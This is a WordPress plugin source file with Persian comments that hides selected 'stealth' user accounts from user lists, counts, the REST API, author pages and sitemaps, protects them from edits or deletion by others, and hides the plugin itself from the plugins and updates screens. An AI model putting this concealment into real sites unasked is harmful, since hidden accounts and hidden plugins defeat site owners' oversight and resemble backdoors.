<?php
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * پنهان‌سازی کاربر (Stealth)
 * کاربرِ پنهان از «لیست کاربران، جستجو، منوی کشویی نویسنده‌ها، REST API و نقشه‌ی سایت» دیده نمی‌شود
 * و دیگران نمی‌توانند او را ویرایش، حذف یا تغییر نقش بدهند.
 * کاربران پنهان همدیگر و همه‌چیز را می‌بینند.
 */

function gvac_stealth_defaults() {
	return array(
		'users'      => 1, // لیست کاربران و جستجو
		'rest'       => 1, // REST API
		'author'     => 0, // آرشیو نویسنده و نقشه‌ی سایت (۴۰۴ شود)
		'protect'    => 1, // ویرایش/حذف/تغییر نقش او توسط دیگران ممنوع
		'from'       => 'all', // all | selected
		'from_roles' => array(),
		'from_users' => array(),
	);
}

function gvac_stealth_all() {
	$a = get_option( 'gvac_stealth', array() );
	return is_array( $a ) ? $a : array();
}

function gvac_stealth_get( $uid ) {
	$all = gvac_stealth_all();
	return isset( $all[ $uid ] ) ? wp_parse_args( $all[ $uid ], gvac_stealth_defaults() ) : null;
}

function gvac_stealth_save( $uid, $cfg ) {
	$all = gvac_stealth_all();
	if ( null === $cfg ) {
		unset( $all[ $uid ] );
	} else {
		$d   = gvac_stealth_defaults();
		$out = array();
		foreach ( array( 'users', 'rest', 'author', 'protect' ) as $f ) {
			$out[ $f ] = empty( $cfg[ $f ] ) ? 0 : 1;
		}
		$out['from']       = ( isset( $cfg['from'] ) && 'selected' === $cfg['from'] ) ? 'selected' : 'all';
		$out['from_roles'] = isset( $cfg['from_roles'] ) ? array_values( array_map( 'sanitize_key', (array) $cfg['from_roles'] ) ) : array();
		$out['from_users'] = isset( $cfg['from_users'] ) ? array_values( array_filter( array_map( 'intval', (array) $cfg['from_users'] ) ) ) : array();
		$all[ $uid ]       = $out + $d;
	}
	update_option( 'gvac_stealth', $all, true );
	$GLOBALS['gvac_hidden_memo'] = array();
}

function gvac_is_stealth_user( $uid ) {
	$all = gvac_stealth_all();
	return isset( $all[ (int) $uid ] );
}

/** آیا کاربر هدف از چشم این بیننده پنهان است؟ ($viewer=0 یعنی مهمان) */
function gvac_stealth_hidden_from( $target, $viewer ) {
	$cfg = gvac_stealth_get( (int) $target );
	if ( ! $cfg || (int) $target === (int) $viewer || gvac_engine_off_stealth() ) {
		return false;
	}
	if ( $viewer && gvac_is_stealth_user( $viewer ) ) {
		return false;
	}
	if ( 'all' === $cfg['from'] ) {
		return true;
	}
	if ( ! $viewer ) {
		return false;
	}
	if ( in_array( (int) $viewer, array_map( 'intval', $cfg['from_users'] ), true ) ) {
		return true;
	}
	$u = get_userdata( $viewer );
	return $u && array_intersect( (array) $u->roles, $cfg['from_roles'] );
}

/** پنهان‌سازی کاربر به کلید اصلی/حالت اضطراری وابسته نیست جز با ثابت اضطراری */
function gvac_engine_off_stealth() {
	return defined( 'GV_AC_DISABLE' ) && GV_AC_DISABLE;
}

/** شناسه‌ی کاربرانی که این بیننده نباید ببیند. $flag: users | rest | author */
function gvac_hidden_ids_for( $viewer, $flag = 'users' ) {
	$memo = &$GLOBALS['gvac_hidden_memo'];
	if ( ! is_array( $memo ) ) {
		$memo = array();
	}
	$k = $viewer . ':' . $flag;
	if ( isset( $memo[ $k ] ) ) {
		return $memo[ $k ];
	}
	$ids = array();
	foreach ( array_keys( gvac_stealth_all() ) as $uid ) {
		$cfg = gvac_stealth_get( $uid );
		if ( $cfg && ! empty( $cfg[ $flag ] ) && gvac_stealth_hidden_from( $uid, $viewer ) ) {
			$ids[] = (int) $uid;
		}
	}
	return $memo[ $k ] = $ids;
}

/** آیا «بیننده» نباید بتواند «هدف» را ویرایش/حذف کند؟ */
function gvac_stealth_blocks( $actor, $target ) {
	$cfg = gvac_stealth_get( (int) $target );
	return $cfg && ! empty( $cfg['protect'] ) && gvac_stealth_hidden_from( $target, $actor );
}

/* ------------------------- لیست کاربران ------------------------- */

add_action( 'pre_get_users', function ( $q ) {
	if ( defined( 'GVAC_NO_STEALTH_FILTER' ) ) {
		return;
	}
	$ids = gvac_hidden_ids_for( get_current_user_id(), 'users' );
	if ( $ids ) {
		$q->set( 'exclude', array_values( array_unique( array_merge( (array) $q->get( 'exclude' ), $ids ) ) ) );
	}
} );

add_filter( 'views_users', function ( $views ) {
	$ids = gvac_hidden_ids_for( get_current_user_id(), 'users' );
	if ( ! $ids ) {
		return $views;
	}
	$sub = array( 'all' => 0 );
	foreach ( $ids as $id ) {
		$u = get_userdata( $id );
		if ( ! $u ) {
			continue;
		}
		$sub['all']++;
		foreach ( (array) $u->roles as $r ) {
			$sub[ $r ] = isset( $sub[ $r ] ) ? $sub[ $r ] + 1 : 1;
		}
	}
	foreach ( $views as $k => $html ) {
		if ( empty( $sub[ $k ] ) ) {
			continue;
		}
		$n          = $sub[ $k ];
		$views[ $k ] = preg_replace_callback( '#<span class="count">\(([^)]+)\)</span>#u', function ( $m ) use ( $n ) {
			$cur = (int) preg_replace( '/\D/', '', strtr( $m[1], array( '۰' => 0, '۱' => 1, '۲' => 2, '۳' => 3, '۴' => 4, '۵' => 5, '۶' => 6, '۷' => 7, '۸' => 8, '۹' => 9 ) ) );
			return '<span class="count">(' . number_format_i18n( max( 0, $cur - $n ) ) . ')</span>';
		}, $html );
	}
	return $views;
} );

/* ------------------------------ REST ------------------------------ */

add_filter( 'rest_user_query', function ( $args ) {
	$ids = gvac_hidden_ids_for( get_current_user_id(), 'rest' );
	if ( $ids ) {
		$args['exclude'] = array_values( array_unique( array_merge( isset( $args['exclude'] ) ? (array) $args['exclude'] : array(), $ids ) ) );
	}
	return $args;
} );

add_filter( 'rest_pre_dispatch', function ( $result, $server, $request ) {
	if ( preg_match( '#^/wp/v2/users/(\d+)$#', $request->get_route(), $m ) && in_array( (int) $m[1], gvac_hidden_ids_for( get_current_user_id(), 'rest' ), true ) ) {
		return new WP_Error( 'rest_user_invalid_id', __( 'Invalid user ID.' ), array( 'status' => 404 ) );
	}
	return $result;
}, 10, 3 );

/* ---------------------- آرشیو نویسنده و نقشه‌ی سایت ---------------------- */

add_action( 'template_redirect', function () {
	if ( is_author() ) {
		$id = (int) get_queried_object_id();
		if ( $id && in_array( $id, gvac_hidden_ids_for( get_current_user_id(), 'author' ), true ) ) {
			global $wp_query;
			$wp_query->set_404();
			status_header( 404 );
			nocache_headers();
			include get_query_template( '404' );
			exit;
		}
	}
}, 0 );

add_filter( 'wp_sitemaps_users_query_args', function ( $args ) {
	$ids = gvac_hidden_ids_for( 0, 'author' );
	if ( $ids ) {
		$args['exclude'] = array_values( array_unique( array_merge( isset( $args['exclude'] ) ? (array) $args['exclude'] : array(), $ids ) ) );
	}
	return $args;
} );

/* -------------------- پنهان‌سازی خودِ افزونه گروت ویژن -------------------- */

/** این کاربر نباید افزونه را ببیند؟ */
function gvac_plugin_hidden_for( $uid ) {
	if ( ! gvac_opt( 'hide_plugin' ) || gvac_engine_off_stealth() ) {
		return false;
	}
	$uid = (int) $uid;
	if ( ! $uid ) {
		return false;
	}
	if ( gvac_is_stealth_user( $uid ) ) {
		return false;
	}
	if ( gvac_is_immune( $uid ) && ! gvac_preview_for( $uid ) ) {
		return false;
	}
	return true;
}

function gvac_is_plugin_slug( $slug ) {
	static $exact = null;
	if ( null === $exact ) {
		$exact = array();
		if ( defined( 'GV_HUB_SLUG' ) ) {
			$exact[] = GV_HUB_SLUG;
		}
		if ( function_exists( 'gv_hub_get_items' ) ) {
			foreach ( gv_hub_get_items() as $it ) {
				if ( ! empty( $it['page'] ) ) {
					$exact[] = $it['page'];
				}
			}
		}
		$exact = apply_filters( 'gvac_plugin_menu_slugs', $exact );
	}
	if ( in_array( $slug, $exact, true ) ) {
		return true;
	}
	foreach ( array( 'groot-vision', 'gv-', 'gv_', 'gvac', 'gvwr', 'clx-' ) as $p ) {
		if ( 0 === strpos( $slug, $p ) ) {
			return true;
		}
	}
	return false;
}

add_filter( 'all_plugins', function ( $plugins ) {
	if ( defined( 'GV_TOOLS_PATH' ) && gvac_plugin_hidden_for( get_current_user_id() ) ) {
		unset( $plugins[ plugin_basename( GV_TOOLS_PATH . 'groot-vision-tools.php' ) ] );
	}
	return $plugins;
} );

add_filter( 'site_transient_update_plugins', function ( $t ) {
	if ( is_object( $t ) && defined( 'GV_TOOLS_PATH' ) && gvac_plugin_hidden_for( get_current_user_id() ) ) {
		$b = plugin_basename( GV_TOOLS_PATH . 'groot-vision-tools.php' );
		unset( $t->response[ $b ], $t->no_update[ $b ] );
	}
	return $t;
} );
